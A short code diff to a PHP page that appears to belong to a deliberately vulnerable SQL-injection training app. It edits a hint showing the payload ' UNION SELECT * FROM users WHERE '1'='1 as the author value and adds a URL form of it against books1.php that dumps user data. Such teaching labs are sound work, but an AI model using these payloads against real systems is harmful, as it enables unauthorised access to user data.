@@ -163,7 +163,8 @@ if ($query != null)
         <div class="col-sm-12">
           <div class="highlight">
             <pre>
-Pass <strong>' UNION SELECT * FROM users WHERE '1'='1</strong> as author to get all users data.
+Pass <strong>' UNION SELECT * FROM users WHERE '1'='1</strong> as author to get all users data.<br>
+The same result is obtained by using url <a href="books1.php?author='+UNION+SELECT+*+FROM+users+WHERE '1'='1"><strong>books1.php?author='+UNION+SELECT+*+FROM+users+WHERE '1'='1</strong></a>.
             </pre>
           </div>
         </div>
